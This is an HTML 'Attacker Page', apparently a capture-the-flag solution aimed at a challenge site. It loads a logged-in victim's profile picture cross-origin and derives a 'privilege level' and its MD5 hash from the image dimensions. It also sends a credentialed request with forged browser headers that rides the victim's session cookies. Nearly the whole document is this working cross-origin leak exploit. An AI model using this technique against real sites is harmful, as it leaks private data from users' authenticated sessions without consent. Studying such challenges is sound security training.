<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Attacker Page</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.19.0/js/md5.min.js"></script>
</head>
<body>
    <h1>Fetching Pepe's Profile Picture</h1>
    <img id="profilePic" style="display:none;" />
    <p id="result"></p>

    <script>
        const img = new Image();
        img.crossOrigin = "Anonymous"; // Required for cross-origin image loading
        img.src = "https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar/profile-pic";

        img.onload = function() {
            const width = img.width;
            const height = img.height;
            const privilegeLevel = width * height;
            const hash = md5(privilegeLevel.toString()); // Compute MD5 hash
            let resultText = `Image Dimensions: ${width} x ${height}\nPrivilege Level: ${privilegeLevel}\nMD5 Hash: ${hash}`;

            // Send additional GET request to /profile-pic
            fetch("https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar/profile-pic", {
                method: "GET",
                headers: {
                    "Accept": "image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Referer": "https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar/",
                    "Sec-Fetch-Dest": "image",
                    "Sec-Fetch-Mode": "no-cors",
                    "Sec-Fetch-Site": "same-origin",
                    "Priority": "u=5"
                },
                credentials: "include" // Include cookies for session
            })
            .then(response => {
                resultText += `\nAdditional GET Request Status: ${response.status} ${response.statusText}`;
                document.getElementById("result").innerText = resultText;
            })
            .catch(error => {
                resultText += `\nAdditional GET Request Failed: ${error.message}`;
                document.getElementById("result").innerText = resultText;
            });

            document.getElementById("result").innerText = resultText;
        };

        img.onerror = function() {
            document.getElementById("result").innerText = "Error loading image. Ensure Pepe is logged in.";
        };

        document.getElementById("profilePic").src = img.src;
    </script>
</body>
</html>
